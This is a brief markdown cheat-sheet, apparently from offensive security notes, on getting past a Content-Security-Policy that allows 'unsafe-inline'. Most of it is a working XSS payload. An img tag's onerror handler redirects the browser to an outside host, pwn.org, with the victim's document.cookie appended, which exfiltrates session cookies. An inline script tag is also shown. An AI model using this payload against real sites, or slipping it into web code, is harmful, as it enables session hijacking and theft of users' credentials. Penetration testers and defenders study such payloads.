# Bypass Content-Security-Policy

>'unsafe-inline' :

	using inline script tag : `<script>/*some stuff*/</script>`

	if its blocked we can just use : `<img src onerror="location.href='//pwn.org/index.php?content='.concat(document.cookie);">`